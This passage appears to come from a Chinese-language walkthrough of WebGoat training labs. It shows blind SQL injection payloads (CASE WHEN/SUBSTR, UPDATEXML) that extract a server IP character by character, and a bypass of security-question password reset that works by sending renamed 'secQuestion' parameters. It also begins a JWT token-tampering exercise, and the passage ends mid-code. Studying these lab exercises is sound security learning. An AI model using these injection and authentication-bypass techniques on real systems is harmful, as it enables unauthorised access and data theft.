<span class="w">  </span><span class="nt">&quot;ip&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;192.168.6.4&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;mac&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;EF:12:FE:34:AA:CC&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;status&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;offline&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;description&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Pre-production server&quot;</span><span class="w"></span>
<span class="p">}</span><span class="w"> </span><span class="p">]</span><span class="w"></span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="n">UPDATEXML</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="k">IF</span><span class="p">((</span><span class="n">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">ip</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">servers</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">hostname</span><span class="o">=</span><span class="s1">&#39;webgoat-prd&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">0</span><span class="n">x32</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="n">x00</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="err">尝试过报错，权限不够</span><span class="w"></span>

<span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="n">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">ip</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">servers</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">hostname</span><span class="o">=</span><span class="s1">&#39;webgoat-prd&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">0</span><span class="n">x31</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="n">ip</span><span class="w"> </span><span class="k">ELSE</span><span class="w"> </span><span class="n">mac</span><span class="w"> </span><span class="k">END</span><span class="p">;</span><span class="w"></span>
</code></pre></div>
<p><img alt="image-20221227190957023" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221227190957023.png" /></p>
<p><img alt="image-20221227190719883" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221227190719883.png" /></p>
<p>以上两个结果显示，目标主机<code>webgoat-prd</code>的<code>ip</code>的第一位是<code>1</code>，依次类推可以得到其完整<code>ip</code>。</p>
<div class="highlight"><pre><span></span><code><span class="k">CASE</span><span class="o">+</span><span class="k">WHEN</span><span class="o">+</span><span class="n">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span><span class="o">+</span><span class="n">ip</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">servers</span><span class="o">+</span><span class="k">WHERE</span><span class="o">+</span><span class="n">hostname</span><span class="o">=</span><span class="s1">&#39;webgoat-prd&#39;</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">+</span><span class="k">THEN</span><span class="o">+</span><span class="n">ip</span><span class="o">+</span><span class="k">ELSE</span><span class="o">+</span><span class="n">mac</span><span class="o">+</span><span class="k">END</span><span class="w"></span>
<span class="k">CASE</span><span class="o">+</span><span class="k">WHEN</span><span class="o">+</span><span class="n">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span><span class="o">+</span><span class="n">ip</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">servers</span><span class="o">+</span><span class="k">WHERE</span><span class="o">+</span><span class="n">hostname</span><span class="o">=</span><span class="s1">&#39;webgoat-prd&#39;</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;4&#39;</span><span class="o">+</span><span class="k">THEN</span><span class="o">+</span><span class="n">ip</span><span class="o">+</span><span class="k">ELSE</span><span class="o">+</span><span class="n">mac</span><span class="o">+</span><span class="k">END</span><span class="w"></span>
</code></pre></div>
<h4 id="authentication-bypasses"><code>Authentication Bypasses</code></h4>
<p>题目：<code>2FA Password Reset</code></p>
<p><img alt="image-20221227224641674" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221227224641674.png" /></p>
<p>题目描述大概意思：你在未识别的地点或设备上进行重置密码的操作，需要回答你设置的安全问题。问题是这些安全问题存储在其他设备上，而你忘记了答案。你需要绕过安全问题并成功重置密码。</p>
<p>我们先抓包查看请求的接口地址：</p>
<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/WebGoat/auth-bypass/verify-account</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">127.0.0.1:9080</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">90</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://127.0.0.1:9080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://127.0.0.1:9080/WebGoat/start.mvc</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">JSESSIONID=w242soYrUW243lVbHNmQcjvY9SgVtR44lE2ETUn-</span>
<span class="na">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">empty</span>
<span class="na">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">cors</span>
<span class="na">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>

secQuestion0=test&amp;secQuestion1=test&amp;jsEnabled=1&amp;verifyMethod=SEC_QUESTIONS&amp;userId=12309746
</code></pre></div>
<p>找到接口对应的源码的实现代码：</p>
<div class="highlight"><pre><span></span><code><span class="nd">@PostMapping</span><span class="p">(</span><span class="n">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/auth-bypass/verify-account&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">produces</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;application/json&quot;</span><span class="p">})</span><span class="w"></span>
<span class="nd">@ResponseBody</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">AttackResult</span><span class="w"> </span><span class="nf">completed</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">userId</span><span class="p">,</span><span class="w"> </span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">verifyMethod</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">AccountVerificationHelper</span><span class="w"> </span><span class="n">verificationHelper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AccountVerificationHelper</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">submittedAnswers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parseSecQuestions</span><span class="p">(</span><span class="n">req</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">verificationHelper</span><span class="p">.</span><span class="na">didUserLikelylCheat</span><span class="p">((</span><span class="n">HashMap</span><span class="p">)</span><span class="w"> </span><span class="n">submittedAnswers</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">()</span><span class="w"></span>
<span class="w">                             </span><span class="p">.</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;verify-account.cheated&quot;</span><span class="p">)</span><span class="w"></span>
<span class="w">                             </span><span class="p">.</span><span class="na">output</span><span class="p">(</span><span class="s">&quot;Yes, you guessed correctly, but see the feedback message&quot;</span><span class="p">)</span><span class="w"></span>
<span class="w">                             </span><span class="p">.</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="c1">// else</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">verificationHelper</span><span class="p">.</span><span class="na">verifyAccount</span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">userId</span><span class="p">),</span><span class="w"> </span><span class="p">(</span><span class="n">HashMap</span><span class="p">)</span><span class="w"> </span><span class="n">submittedAnswers</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">userSessionData</span><span class="p">.</span><span class="na">setValue</span><span class="p">(</span><span class="s">&quot;account-verified-id&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">userId</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">success</span><span class="p">()</span><span class="w"></span>
<span class="w">                             </span><span class="p">.</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;verify-account.success&quot;</span><span class="p">)</span><span class="w"></span>
<span class="w">                             </span><span class="p">.</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">()</span><span class="w"></span>
<span class="w">                             </span><span class="p">.</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;verify-account.failed&quot;</span><span class="p">)</span><span class="w"></span>
<span class="w">                             </span><span class="p">.</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>其中有两个关键的校验方法：<code>didUserLikelylCheat</code>和<code>verifyAccount</code>，查看其具体实现代码</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">didUserLikelylCheat</span><span class="p">(</span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">submittedAnswers</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">boolean</span><span class="w"> </span><span class="n">likely</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">submittedAnswers</span><span class="p">.</span><span class="na">size</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">secQuestionStore</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">verifyUserId</span><span class="p">).</span><span class="na">size</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">likely</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">submittedAnswers</span><span class="p">.</span><span class="na">containsKey</span><span class="p">(</span><span class="s">&quot;secQuestion0&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">submittedAnswers</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;secQuestion0&quot;</span><span class="p">).</span><span class="na">equals</span><span class="p">(</span><span class="n">secQuestionStore</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">verifyUserId</span><span class="p">).</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;secQuestion0&quot;</span><span class="p">)))</span><span class="w"></span>
<span class="w">        </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">submittedAnswers</span><span class="p">.</span><span class="na">containsKey</span><span class="p">(</span><span class="s">&quot;secQuestion1&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">submittedAnswers</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;secQuestion1&quot;</span><span class="p">).</span><span class="na">equals</span><span class="p">(</span><span class="n">secQuestionStore</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">verifyUserId</span><span class="p">).</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;secQuestion1&quot;</span><span class="p">))))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">likely</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">likely</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">likely</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">verifyAccount</span><span class="p">(</span><span class="n">Integer</span><span class="w"> </span><span class="n">userId</span><span class="p">,</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">submittedQuestions</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="c1">//short circuit if no questions are submitted</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">submittedQuestions</span><span class="p">.</span><span class="na">entrySet</span><span class="p">().</span><span class="na">size</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">secQuestionStore</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">verifyUserId</span><span class="p">).</span><span class="na">size</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">submittedQuestions</span><span class="p">.</span><span class="na">containsKey</span><span class="p">(</span><span class="s">&quot;secQuestion0&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">submittedQuestions</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;secQuestion0&quot;</span><span class="p">).</span><span class="na">equals</span><span class="p">(</span><span class="n">secQuestionStore</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">verifyUserId</span><span class="p">).</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;secQuestion0&quot;</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">submittedQuestions</span><span class="p">.</span><span class="na">containsKey</span><span class="p">(</span><span class="s">&quot;secQuestion1&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">submittedQuestions</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;secQuestion1&quot;</span><span class="p">).</span><span class="na">equals</span><span class="p">(</span><span class="n">secQuestionStore</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">verifyUserId</span><span class="p">).</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;secQuestion1&quot;</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="c1">// else</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>第一个<code>didUserLikelylCheat</code>方法关键的校验代码在</p>
<div class="highlight"><pre><span></span><code>submittedAnswers.containsKey(&quot;secQuestion0&quot;) &amp;&amp; 
submittedAnswers.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;)) &amp;&amp; 
submittedAnswers.containsKey(&quot;secQuestion1&quot;) &amp;&amp; 
submittedAnswers.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;))
</code></pre></div>
<p>需要四个条件同时满足才返回<code>true</code>，不太可能绕过。于是我们把重点放在<code>verifyAccount</code>方法校验的绕过上面。</p>
<p>第一个条件右边<code>secQuestionStore.get(verifyUserId).size()</code>的值始终是<code>2</code>，要求<code>submittedQuestions</code>有两条数据（否则直接返回<code>false</code>了），这个条件容易满足。再看第二、三个条件：</p>
<div class="highlight"><pre><span></span><code><span class="n">submittedQuestions</span><span class="p">.</span><span class="na">containsKey</span><span class="p">(</span><span class="s">&quot;secQuestion0&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">submittedQuestions</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;secQuestion0&quot;</span><span class="p">).</span><span class="na">equals</span><span class="p">(</span><span class="n">secQuestionStore</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">verifyUserId</span><span class="p">).</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;secQuestion0&quot;</span><span class="p">))</span><span class="w"></span>
</code></pre></div>
<p>如果<code>submittedQuestions</code>包含<code>secQuestion0</code>（或<code>secQuestion1</code>）的键，且其值与内置的值不相等，就返回<code>false</code>。那么我们只需要<code>submittedQuestions</code>中不包含<code>secQuestion0</code>键和<code>secQuestion1</code>键，就不会返回<code>false</code>。总结一下就是：<code>submittedQuestions</code>需要包含两个不是<code>secQuestion0</code>和<code>secQuestion1</code>的键。最后我们来看一下<code>submittedQuestions</code>的生成方法：<code>parseSecQuestions</code></p>
<div class="highlight"><pre><span></span><code><span class="kd">private</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">parseSecQuestions</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">userAnswers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">paramNames</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Collections</span><span class="p">.</span><span class="na">list</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="na">getParameterNames</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">paramName</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">paramNames</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="c1">//String paramName = req.getParameterNames().nextElement();</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">paramName</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;secQuestion&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">userAnswers</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">paramName</span><span class="p">,</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="n">paramName</span><span class="p">));</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">HashMap</span><span class="p">)</span><span class="w"> </span><span class="n">userAnswers</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>将前端传过来的所有参数中，参数名包含<code>secQuestion</code>的参数和值放到<code>HashMap</code>中返回。结合前面的分析，我们只需要构造的参数满足以下两个条件即可：</p>
<ul>
<li>有两个参数的参数名包含字符串<code>secQuestion</code></li>
<li>参数名不能等于<code>secQuestion0</code>或<code>secQuestion1</code></li>
</ul>
<p>这样的构造当然有任意多种，比如：<code>asecQuestion=1&amp;bsecQuestion=1</code>，<code>secQuestion3=1&amp;secQuestion4=1</code>，<code>abcsecQuestionxyz=1&amp;secQuestoin00=1</code></p>
<p><img alt="image-20221227232608085" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221227232608085.png" /></p>
<h4 id="jwt-token"><code>JWT Token</code></h4>
<p><code>JSON Web Token(JWT)</code>是一种开放标准(<a href="https://www.rfc-editor.org/rfc/rfc7519">RFC 7519</a>)，它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输<code>JSON</code>对象信息。这些信息经过加密，并携带数字签名，因此可以被验证和信任。<code>JWT</code>可以使用密钥（使用<code>HMAC</code>算法）或者使用<code>RSA</code>的公钥/私钥对进行签名。<code>JWT</code>用于携带与客户端的身份和特征(声明)相关的信息，由服务器签名，以避免客户端篡改它来更改身份或任何特征(如将普通用户更改为管理员，或更改客户端登录名)。此令牌<code>(Token)</code>在身份验证期间创建（验证成功的情况下），并在任何处理之前由服务器验证。</p>
<p><code>JWT</code>结构：由三部分组成：<code>Header</code>,<code>Claims</code>,<code>Signature</code>，即头部、声明（载荷）、签名，各部分之间由点号<code>(.)</code>连接。</p>
<p><img alt="image-20221228083908141" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228083908141.png" /></p>
<p><code>JWT</code>进行身份验证的过程：</p>
<ul>
<li>浏览器发送身份验证信息（账户名和密码）到服务器请求登录</li>
<li>服务器验证通过后，使用密钥生成<code>JWT</code>令牌</li>
<li>服务器将<code>JWT</code>令牌发送给浏览器</li>
<li>浏览器在请求头的<code>Cookie</code>中携带<code>JWT</code>令牌进行<code>HTTP</code>请求</li>
<li>服务器验证<code>JWT</code>的签名，并从中获取用户信息</li>
<li>服务器发送响应数据到客户端（浏览器）</li>
</ul>
<p><img alt="image-20221228114015356" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228114015356.png" /></p>
<p>题目：<code>Try to change the token you receive and become an admin user by changing the token and once you are admin reset the votes</code>，你需要通过修改<code>token</code>获取管理员权限。</p>
<p><img alt="image-20221228114245815" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228114245815.png" /></p>
<p>首先默认的用户是<code>Guest</code>，我们切换到<code>Tom</code>并抓包，得到切换用户的接口信息</p>
<p><img alt="image-20221228114750067" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228114750067.png" /></p>
<p>接口地址是<code>/WebGoat/JWT/votings/login</code>，并且该接口返回了<code>JWT</code>格式的<code>access_token</code>。而后续的投票请求（接口地址<code>/WebGoat/JWT/votings</code>）都将携带该<code>Cookie</code>值。我们找到源码中接口方法的实现代码</p>
<div class="highlight"><pre><span></span><code><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&quot;/JWT/votings/login&quot;</span><span class="p">)</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">user</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">validUsers</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">user</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">claims</span><span class="p">().</span><span class="na">setIssuedAt</span><span class="p">(</span><span class="n">Date</span><span class="p">.</span><span class="na">from</span><span class="p">(</span><span class="n">Instant</span><span class="p">.</span><span class="na">now</span><span class="p">().</span><span class="na">plus</span><span class="p">(</span><span class="n">Duration</span><span class="p">.</span><span class="na">ofDays</span><span class="p">(</span><span class="mi">10</span><span class="p">))));</span><span class="w"></span>
<span class="w">        </span><span class="n">claims</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;admin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;false&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">claims</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">builder</span><span class="p">()</span><span class="w"></span>
<span class="w">            </span><span class="p">.</span><span class="na">setClaims</span><span class="p">(</span><span class="n">claims</span><span class="p">)</span><span class="w"></span>
<span class="w">            </span><span class="p">.</span><span class="na">signWith</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="na">jsonwebtoken</span><span class="p">.</span><span class="na">SignatureAlgorithm</span><span class="p">.</span><span class="na">HS512</span><span class="p">,</span><span class="w"> </span><span class="n">JWT_PASSWORD</span><span class="p">)</span><span class="w"></span>
<span class="w">            </span><span class="p">.</span><span class="na">compact</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="n">Cookie</span><span class="w"> </span><span class="n">cookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Cookie</span><span class="p">(</span><span class="s">&quot;access_token&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">token</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">response</span><span class="p">.</span><span class="na">addCookie</span><span class="p">(</span><span class="n">cookie</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">response</span><span class="p">.</span><span class="na">setStatus</span><span class="p">(</span><span class="n">HttpStatus</span><span class="p">.</span><span class="na">OK</span><span class="p">.</span><span class="na">value</span><span class="p">());</span><span class="w"></span>
<span class="w">        </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="n">MediaType</span><span class="p">.</span><span class="na">APPLICATION_JSON_VALUE</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
